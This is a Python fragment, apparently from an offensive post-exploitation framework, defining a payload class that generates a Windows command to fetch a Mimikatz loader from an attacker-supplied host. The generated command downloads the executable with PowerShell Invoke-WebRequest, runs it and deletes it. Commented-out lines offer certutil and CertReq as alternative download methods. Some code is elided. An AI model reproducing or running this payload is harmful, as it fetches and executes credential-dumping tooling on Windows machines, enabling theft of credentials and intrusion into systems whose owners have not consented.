...
class Payload:
    name = 'loader_mimikatz_payload_x64'
    type = 'cmd'
    args = ['ip:http_port']
    ...
    def generate_payload(self, ip_port):
        # Mimikatz in memory
        arch = "x64"
        ondisk_name = "C:\\loader.exe"

        loader_name = "loader_mimikatz_%s_%s.exe" % (ip_port, arch)

        mimikatz_md5 = get_ressource_md5('mimikatz_%s.dll' % arch)

        # check if the loader exists
        if not os.path.exists(os.path.join(os.path.dirname(__file__), "..", "ressources", loader_name)):
            # create it
            ...
            # save it
            generated_loader_file = open(os.path.join(os.path.dirname(__file__), "..", "ressources", loader_name), "wb")
            generated_loader_file.write(binary)
            generated_loader_file.close()

        loader_md5 = get_ressource_md5(loader_name)

        #payload  = "CertReq -Post -config http://%s/ressources/%s c:\windows\win.ini %s && " % (ip_port, loader_md5, ondisk_name)
        #payload  = "certutil.exe -urlcache -split -f http://%s/ressources/%s %s && " % (ip_port, loader_md5, ondisk_name)
        payload  = "powershell.exe Invoke-WebRequest -URI \"http://%s/ressources/%s\" -OutFile \"%s\" && " % (ip_port, loader_md5, ondisk_name)
        payload += "%s & " % ondisk_name
        payload += "del %s & " % ondisk_name
        payload += "echo Done"
